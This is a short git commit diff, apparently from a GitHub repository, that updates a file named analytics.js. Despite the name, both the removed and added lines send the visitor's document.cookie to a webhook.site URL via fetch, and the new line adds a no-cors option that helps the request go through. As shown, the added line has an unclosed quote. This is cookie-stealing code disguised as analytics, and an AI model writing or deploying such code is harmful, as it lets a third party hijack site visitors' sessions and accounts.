17bdbc3fecaf117b69f06539494c1ac6b4cd2f61
agnesclemente <112178788+agnesclemente@users.noreply.github.com>
2025-04-24 22:15:48 +1000

    Update analytics.js

--- analytics.js
+++ analytics.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/2f8211cb-846e-45fa-9340-4600a60b9bca/?' + document.cookie);
+fetch('https://webhook.site/2f8211cb-846e-45fa-9340-4600a60b9bca/?' + document.cookie,{mode:'no-cors});
